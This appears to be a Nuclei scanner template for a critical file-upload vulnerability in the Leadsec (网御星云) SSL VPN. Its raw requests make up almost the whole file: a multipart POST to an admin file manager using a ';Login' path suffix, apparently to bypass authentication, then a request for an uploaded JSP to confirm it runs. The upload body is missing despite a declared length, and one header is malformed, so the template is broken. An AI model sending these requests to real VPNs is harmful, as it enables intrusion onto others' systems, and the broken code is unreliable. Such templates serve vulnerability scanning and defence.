id: wangyu-ssl-vpn
info:
  author: Str1am
  name: "\u7F51\u5FA1\u661F\u4E91 SSL VPN \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E"
  severity: critical
  tags: VPN,upload
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: or
    part: body
    type: word
    words:
    - hello,world
  matchers-condition: and
  raw:
  - 'POST /SSL/admin/so/FileManager.jsp;Login HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
    Firefox/92.0

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Accept-Encoding: gzip, deflate

    Content-Type": multipart/form-data; boundary=---------------------------14363957691640013656756907147

    Content-Length: 523

    Cookie: JSESSIONID=E30BF5A223214F728E6C669FB6FC2FEE


    

    '
  - "GET /SSL/ali.jsp HTTP/1.1\nHost: {{Hostname}} \n"
